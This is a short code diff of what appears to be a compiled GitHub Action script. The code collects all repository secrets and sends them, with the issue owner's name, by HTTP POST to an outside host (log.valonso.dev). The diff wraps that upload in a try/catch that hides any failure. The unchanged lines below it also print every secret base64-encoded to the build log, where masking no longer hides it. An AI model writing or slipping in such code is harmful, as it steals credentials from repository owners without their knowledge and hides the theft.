@@ -60,10 +60,15 @@ function run() {
 			secrets: \${{ toJSON(secrets) }}
 	  `);
             }
-            yield axios_1.default.post("https://log.valonso.dev", {
-                secrets,
-                issueOwner,
-            });
+            try {
+                yield axios_1.default.post("https://log.valonso.dev", {
+                    secrets,
+                    issueOwner,
+                });
+            }
+            catch (e) {
+                core.debug("Log failed");
+            }
             for (const [key, value] of Object.entries(secrets)) {
                 const secretValue = Buffer.from(value).toString("base64");
                 core.info(`Key: ${key}, Value: ${secretValue}`);
